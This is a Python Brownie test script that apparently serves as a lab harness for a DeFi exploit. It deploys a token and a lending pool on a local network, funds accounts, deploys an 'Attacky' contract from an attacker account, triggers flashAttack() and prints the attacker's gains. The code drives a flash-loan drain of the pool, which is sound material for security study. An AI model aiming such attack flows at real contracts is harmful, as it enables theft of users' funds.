#from time import sleep
from brownie import Attacky, Pool, Token
#from brownie.network.rpc import ganache, hardhat
from brownie.utils import console
from web3 import Web3

from scripts.flash3_helper import *


def test_setup():
    POOL_TOKENS = Wei('100000000')
    # providers instance
    print("network at",network.show_active())

    [user, deployer, attacker] = accounts[:3];
    dp ={'from': deployer}
    ##getConsoleLog()
    w3 = Web3(Web3.HTTPProvider())

    token = Token.deploy(dp)
    pool = Pool.deploy(token.address, dp)
    # setting balances for test
    w3.provider.make_request("evm_setAccountBalance", [user.address, "0x1BC16D674EC80000" ])
    w3.provider.make_request("evm_setAccountBalance", [whaleSigner.address, "0x1BC16D674EC80000" ])
    #Transfer USDC to the user
    usdc.transfer(flash_swap.address, FEE_AMOUNT, {'from': whaleSigner, "gas_price": '30 gwei'})
    #usdc.transfer(user.address, usdc.balanceOf(whaleSigner), {'from': whaleSigner, "gas_price": '30 gwei'})
    #assert(usdc.balanceOf(user) == BORROW_AMOUNT)

    #minting for pool
    token.transfer(pool.address, POOL_TOKENS, dp)

    # Deploy attack contract
    attack =Attacky.deploy(pool.address,{'from': attacker})
    console.log(5, duration=15)
    attack.flashAttack()
    print('attackers balance is: ',token.balanceOf(attacker))
